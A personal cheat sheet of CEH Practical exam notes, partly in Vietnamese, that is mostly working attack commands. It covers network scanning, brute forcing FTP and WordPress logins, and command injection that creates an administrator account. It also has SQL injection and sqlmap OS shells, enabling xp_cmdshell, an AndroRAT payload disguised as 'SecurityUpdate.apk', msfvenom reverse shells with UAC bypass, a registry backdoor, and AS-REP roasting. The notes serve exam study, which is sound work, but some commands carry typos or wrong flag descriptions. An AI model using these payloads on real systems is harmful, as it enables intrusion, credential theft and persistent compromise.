# My ceh practical notes
# IP
```
Kali
Win11
Server22
Server19
```
#  Scanning Networks (always do sudo su) --> To be root
```
1- Nmap scan for alive/active hosts 
   nmap -A <dai mang> or nmap -T4 -A ip
   nmap -sn -PR <dai mang> 
   netdiscover -r <dai mang>
2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-  namp -f 10.10.10.16
4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
7- nmap --script smb-os-discovery.nse <ipaddr> (If host is windows this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
9- Xác định lỗ hổng
   nmap -Pn --script=vuln <ipaddr>

```
# Enumeration
```
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16

3- SNMP enum using nmap-  
   nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
   snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot

4- DNS recon/enum-  dnsrecon -d www.google.com -z
5- FTP enum using nmap-  nmap -p 21 -A <ipaddr> 
6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
7- ldap enum-How many user 
   ldapsearch -x -H ldap://<ipaddr> -b "dc=CEH,dc=com" "(objectClass=user)" cn
   ldapsearch -x -H ldap://<ipaddr> -s base
   ldb <domain> 																	(xac dinh loadbalancing)
8- smtp-enum-How many user 
   nmap -p25 --script=smtp-enum-users <ipaddr>
   
```
#  Quick Overview (Stegnography) --> Snow , Openstego
```
SNOW -C -m "<text>" -p "<pwd>" readme.txt readme2.txt   (1- Hide Data Using Whitespace Stegnography- pwd is password and your secret is stored in 														 readme2.txt along with the content of readme.txt)
SNOW -C -p "<pwd>" readme2.txt 							(To Display Hidden Data- then it will show the content of readme2.txt content)

steghide extract -sf stealth.jpeg 						(Extract hidden file)

Image Stegnography using Openstego
```
<img width="700" height="400" alt="68747470733a2f2f7777772e6f70656e737465676f2e636f6d2f696d6167652f73637265656e73686f742f30312e706e67" src="https://github.com/user-attachments/assets/fca798fa-be91-4eaa-94e5-55e3c67dd0bc" />
<img width="700" height="400" alt="68747470733a2f2f7777772e6f70656e737465676f2e636f6d2f696d6167652f73637265656e73686f742f30322e706e67" src="https://github.com/user-attachments/assets/08f5331b-44bb-4877-9523-1936b5eaf5e5" />

 
#  Sniffing
```
1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```
#  Hacking Web Servers
```
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

hydra -l user -P passlist.txt ftp://10.10.10.10
```
#  Hacking Web Application
```
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://<target ip>:<target port>//NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS <target ip>
						 set RPORT  <target port>  (8080)
						 set TARGETURI http://<target ip>:<target port>/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
```
#  SQL 
```
1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie

   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="<cookie>" --dbs
   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="<cookie>" -D <databaseName> --tables
   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="<cookie>" -D <databaseName> -T <tableName> --dump   
   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version

impacket-mssqlclient <domain>/<username>:<password>@<ipaddr> -windows-auth
impacket-mssqlclient <user>:<pwd>@<ipaddr>

SELECT IS_SRVROLEMEMBER('sysadmin');			(Check quyền)
EXEC sp_configure 'xp_cmdshell';				(Check xp_cmdshell)

EXEC sp_configure 'show advanced options',1;	(Bật nếu cần)
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```
# Android
```

nmap ip -sV -p 5555                                   (Scan for adb port)
adb connect IP:5555                                   (Connect adb with parrot)
adb shell                                             (Access mobile device on parrot)
adb push <pc location> <android location>
adb pull <android location> <pc location>
pwd --> ls --> cd sdcard --> ls --> cat secret.txt    (If you can't find it there then go to Downloads folder using: cd downloads)
python3 phonesploit.py                                 
crc32 												  (Now type crc32 path to apk to Determine the complete CRC value)

python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
python3 androRAT.py --shell -i 0.0.0.0 -p 4444

```
# Wireshark
```
tcp.flags.syn == 1 and tcp.flags.ack == 0    		  (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then 													   you can apply the filter given
tcp.flags.syn == 1                           		  (Which machine for dos)
http.request.method == POST                  		  (for passwords) or click tools ---> credentials
tcp.port = 135 || tcp.udp = 111              		  (port rpc)
Also
```
# Find FQDN
```
nmap -p 389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
nmap --script smb-os-discovery.nse <ipaddr>

```
# Cracking Wi-Fi networks
```
Cracking Wifi Password
aircrack-ng [pcap file] (For cracking WEP network)
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

```
# Cracking Hash Password 
```
Kerberos(88)
impacket-GetNUsers  <Domain Controll>/ -dc-ip <ipaddr> -usersfile users.txt -no-pass nano file.hash
john file.hash -wordlist=rockyou.txt 

HTLM
pwDump7.exe > hashes.txt
john --format=NT hashes.txt

AS-REP
python3 GetNPUsers.py <AD domain>/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip <ip dc> 
echo '[HASH]' > joshuahash.txt    hoặc sudo nano joshuahash.txt
john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt

cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p “cupcake”

```
# Privilege Escalation
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ipattacker> LPORT=4444 -f exe > Windows.exe (tạo file reverse)

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ipattacker>
set LPORT 4444
run

background												(để quay lại)
search bypassuac
use exploit/windows/local/bypassuac_fodhelper
set session 1
show option

set LHOST <ipattacker>
set TARGET 0
exploit

background
use post/windows/manage/sticky_keys						(khai thác dù khóa màn hình vẫn cmd đc)
sessions -i*
set session 2 											( chọn session nào là system)


-----------------------------------------------------------------------------------------------------------------

msfvenom -p windows/meterpreter/reverse_tcp lhost=<ipattacker> lport=444 -f exe > /home/attacker/Desktop/Test.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ipattacker> lport=4444 -f exe > /home/attacker/Desktop/registry.exe

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ipattacker>
set LPORT 444
run

(win run Test.exe)

background
(hiện session hiện tại )
use exploit/windows/local/bypassuac_silentcleanup
set session 1 											(chọn session vừa hiện) 		

show option
set LHOST <ipattacker>
set TARGET 0
exploit

reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"	

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ipattacker>
set LPORT 4444
run

```
# SMB
```
smbclient -L //<ip> -N 						(Anonymous)
smbclient -L //<ip> -U <username>
smbclient //<ip>/<share> -U <username>

```

#  Some extra work 
```
nmap -p 3389 -iL ip.txt | grep open 		(Check RDP enabled after getting ip- ip.txt contains all the alive hosts from target subnet)
nmap -p 3306 -iL ip.txt | grep open			(Check MySQL service running- ip.txt contains all the alive hosts from target subnet)
python3 -m http.server 8000
wget http://<ipattacker>:8000/file.exe
Remmina Remote Desktop Client (On kali)
python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
nRAT


```
